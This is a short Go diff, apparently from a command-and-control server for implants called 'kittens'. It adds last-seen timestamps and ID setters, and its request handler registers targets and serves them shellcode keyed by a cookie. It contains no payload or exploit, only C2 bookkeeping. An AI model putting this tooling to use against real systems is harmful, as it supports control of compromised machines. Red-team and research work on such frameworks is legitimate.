@@ -7,12 +7,14 @@ import (
 	"fmt"
 	color "github.com/logrusorgru/aurora"
 	"net/http"
+	"time"
 )
 
 type kitten struct {
 	name       string
 	shellcode  []byte
 	id         int
+	lastSeen   string
 	InitChecks util.InitialChecks
 }
 
@@ -35,6 +37,18 @@ func (K *kitten) SetShellcode(sc []byte) {
 
 func (K *kitten) GetId() int {
 	return K.id
+}
+
+func (K *kitten) SetId(id int) {
+	K.id = id
+}
+
+func (K *kitten) SetLastSeen(t string) {
+	K.lastSeen = t
+}
+
+func (K *kitten) GetLastSeen() string {
+	return K.lastSeen
 }
 
 func (K *kitten) GetInitChecks() util.InitialChecks {
@@ -91,6 +105,7 @@ func logRequest(w http.ResponseWriter, r *http.Request) {
 		Targets[c.KittenName] = &kitten{
 			name:       c.GetKittenName(),
 			id:         len(Targets),
+			lastSeen:   time.Now().Format("15:04:05"),
 			shellcode:  Targets["all targets"].GetShellcode(), //Set the shellcode to the default sleep time
 			InitChecks: c,
 		}
@@ -109,6 +124,7 @@ func logRequest(w http.ResponseWriter, r *http.Request) {
 		kittenName := cookie
 		if _, ok := Targets[kittenName]; ok {
 			_, err := w.Write(Targets[kittenName].GetShellcode())
+			Targets[kittenName].SetLastSeen(time.Now().Format("15:04:05"))
 			if err != nil {
 				return
 			}
